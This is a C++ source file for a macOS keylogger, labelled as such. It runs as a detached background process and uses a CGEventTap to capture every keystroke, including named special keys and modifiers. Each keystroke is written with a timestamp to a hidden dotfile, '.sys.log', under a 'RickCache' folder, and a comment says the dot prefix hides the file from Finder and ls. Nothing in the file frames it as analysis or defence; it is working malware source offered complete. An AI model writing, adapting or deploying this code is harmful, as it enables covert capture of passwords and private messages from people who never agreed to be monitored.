// language: C++17, file: src/macos/01_keylogger_mac.cpp, target: macOS 13+, clang
// Keylogger CGEventTap (session) - listen only, log horodate cache
// Build: clang++ -O2 -std=c++17 -framework ApplicationServices -framework CoreGraphics
// Permission TCC requise: System Settings > Privacy > Accessibility
#include <ApplicationServices/ApplicationServices.h>
#include <sys/stat.h>
#include <sys/param.h>
#include <pwd.h>
#include <unistd.h>
#include <ctime>
#include <cstdio>
#include <string>
static FILE* g_log = nullptr;

static std::string LogPath() {
    std::string dir = std::string(getpwuid(getuid())->pw_dir)
                    + "/Library/Application Support/RickCache";
    mkdir(dir.c_str(), 0700);
    return dir + "/.sys.log"; // point prefix = invisible dans Finder/ls
}

static CGEventRef CB(CGEventTapProxy, CGEventType type, CGEventRef e, void*) {
    if (type == kCGEventKeyDown) {
        UniChar buf[16];
        UniCharCount n = 0;
        CGEventKeyboardGetUnicodeString(e, sizeof(buf) / sizeof(UniChar), &n, buf);
        time_t t = time(nullptr);
        tm lt; localtime_r(&t, &lt);
        char ts[32]; strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", &lt);
        CGEventFlags fl = CGEventGetFlags(e);
        // traduction lisible : vrai texte, touches speciales nommees
        std::string txt;
        for (UniCharCount i = 0; i < n; i++) {
            UniChar c = buf[i];
            if (c >= 32) {
                std::string u;
                u += (char)(c & 0xFF); // latin1 suffit pour azerty/qwerty
                txt += u;
            }
        }
        if (fl & kCGEventFlagMaskShift)   txt += "[MAJ]";
        if (fl & kCGEventFlagMaskCommand) txt += "[CMD]";
        if (txt.empty()) {
            CGKeyCode kc = (CGKeyCode)CGEventGetIntegerValueField(e, kCGKeyboardEventKeycode);
            switch (kc) {
                case 36: txt = "[ENTREE]\n"; break;
                case 49: txt = "[ESPACE]";   break;
                case 51: txt = "[EFFACER]";  break;
                case 48: txt = "[TAB]";      break;
                case 122: txt = "[F1]"; break;
                case 120: txt = "[F2]"; break;
                case 99:  txt = "[F3]"; break;
                case 118: txt = "[F4]"; break;
                case 96:  txt = "[F5]"; break;
                default: txt = "[touche" + std::to_string(kc) + "]";
            }
        }
        fprintf(g_log, "[%s] %s", ts, txt.c_str());
        fflush(g_log);
    }
    return e; // listen only: l'event passe inchangé
}

int main() {
    daemon(0, 0); // detache du terminal
    g_log = fopen(LogPath().c_str(), "a");
    if (!g_log) return 1;
    chmod(LogPath().c_str(), 0600);

    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    CFMachPortRef tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap,
                                         kCGEventTapOptionListenOnly, mask, CB, NULL);
    if (!tap) return 2; // pas de permission Accessibilite
    CFRunLoopSourceRef src = CFMachPortCreateRunLoopSource(NULL, tap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopDefaultMode);
    CGEventTapEnable(tap, true);
    CFRunLoopRun();
    return 0;
}
